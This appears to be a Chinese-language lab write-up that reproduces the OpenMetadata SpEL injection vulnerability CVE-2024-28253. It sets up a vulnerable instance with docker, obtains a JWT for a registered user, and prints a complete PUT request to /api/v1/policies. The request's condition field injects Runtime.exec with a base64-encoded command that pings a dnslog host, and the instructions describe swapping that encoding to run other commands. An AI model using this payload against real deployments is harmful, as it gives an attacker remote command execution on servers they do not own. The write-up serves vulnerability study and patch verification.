## OpenMetadata /api/v1/policies SpEL Injection CVE-2024-28253

​	OpenMetadata是一个统一的发现、可观察和治理平台，由中央元数据存储库、深入的沿袭和无缝团队协作提供支持。它是发展最快的开源项目之一，拥有充满活力的社区，并被各行业垂直领域的众多公司采用。OpenMetadata 基于开放元数据标准和 API，支持各种数据服务的连接器，支持端到端元数据管理，让您可以自由地释放数据资产的价值。

​	对于有身份验证的用户可以用通过访问api接口**PUT / POST APIS for /api/v1/policies.**进行表达式注入，进而得到系统权限。

**Affected versions ：**<1.3.1

## 漏洞环境



执行如下命令启动一个OpenMetadata-v1.2.3-web：

```
docker compose -f docker-compose-postgres.yml up --detach
```



环境启动后，访问`http://your-ip:8585`即可跳转到OpenMetadata登录页面

![](https://github.com/Shelter1234/VulneraLab/raw/main/OpenMetadata/CVE-2024-28255/1.png)

## 漏洞复现

1，注册一个新用户

![image-20240508112005258](./2.png)

登录后台 得到认证jwt

![image-20240508112322427](./3.png)

```json
{
    "accessToken":"eyJraWQiOiJHYjM4OWEtOWY3Ni1nZGpzLWE5MmotMDI0MmJrOTQzNTYiLCJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJvcGVuLW1ldGFkYXRhLm9yZyIsInN1YiI6InNoZWx0ZXIiLCJlbWFpbCI6InNoZWx0ZXJAc2hlbHRlci5jb20iLCJpc0JvdCI6ZmFsc2UsInRva2VuVHlwZSI6Ik9NX1VTRVIiLCJpYXQiOjE3MTUxMzg0NTcsImV4cCI6MTcxNTE0MjA1N30.I_jLHBwTadbSJBcVl45Z9r6tUio00exoUbqjnNSjl2yQGE9-TTWnX7YDAw8sGpjIJQvpRradZgO1siALJvuFCVqiCvrlsE9ol2DaUhd2G5F5w-F57iPJdvUybmx-djVfL85iOrty2CCfwOy2ev03EgvQngcglMRYe3VTa_P9yg2JtsX85yJHwA9SJywO_9IDsBsBZUd9izbRfm8k2Aqb7YGpChWQKUeKymvqfWrcY0LJDY2BFZ3ISw6stI8xhWT-GuCaVTolUdSbpzB5YR-LdYJzDpjoXqTwWSN4VoLT3UDoEOJfUJQKwlU1nnVAJdAlTrH9XfaQhnploVk9HEKIiA",
    "refreshToken":"20b22fa3-28a0-40c5-b001-b35f0412859e",
    "tokenType":"Bearer",
    "expiryDuration":1715142057460
}
```

2,添加Authorization认证头，发起如下请求执行系统命令，将执行命令ping  xxx.dnslog.cn 转为base64编码 替换下方payload的base64编码

```
PUT /api/v1/policies HTTP/1.1
Host: 192.168.160.128:8585
Authorization: Bearer eyJraWQiOiJHYjM4OWEtOWY3Ni1nZGpzLWE5MmotMDI0MmJrOTQzNTYiLCJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJvcGVuLW1ldGFkYXRhLm9yZyIsInN1YiI6InNoZWx0ZXIiLCJlbWFpbCI6InNoZWx0ZXJAc2hlbHRlci5jb20iLCJpc0JvdCI6ZmFsc2UsInRva2VuVHlwZSI6Ik9NX1VTRVIiLCJpYXQiOjE3MTUxMzg0NTcsImV4cCI6MTcxNTE0MjA1N30.I_jLHBwTadbSJBcVl45Z9r6tUio00exoUbqjnNSjl2yQGE9-TTWnX7YDAw8sGpjIJQvpRradZgO1siALJvuFCVqiCvrlsE9ol2DaUhd2G5F5w-F57iPJdvUybmx-djVfL85iOrty2CCfwOy2ev03EgvQngcglMRYe3VTa_P9yg2JtsX85yJHwA9SJywO_9IDsBsBZUd9izbRfm8k2Aqb7YGpChWQKUeKymvqfWrcY0LJDY2BFZ3ISw6stI8xhWT-GuCaVTolUdSbpzB5YR-LdYJzDpjoXqTwWSN4VoLT3UDoEOJfUJQKwlU1nnVAJdAlTrH9XfaQhnploVk9HEKIiA
Content-Type: application/json
Content-Length: 369

{"name":"TeamOnlyPolicy","rules":[{"name":"TeamOnlyPolicy-Rule","description":"Deny all the operations on all the resources for all outside the team hierarchy..","effect":"deny","operations":["All"],"resources":["All"],"condition":"T(java.lang.Runtime).getRuntime().exec(new java.lang.String(T(java.util.Base64).getDecoder().decode('cGluZyBraW03N2suZG5zbG9nLmNu')))"}]}
```

![image-20240508114606827](./4.png)



dnslog验证

![image-20240508114639866](./5.png)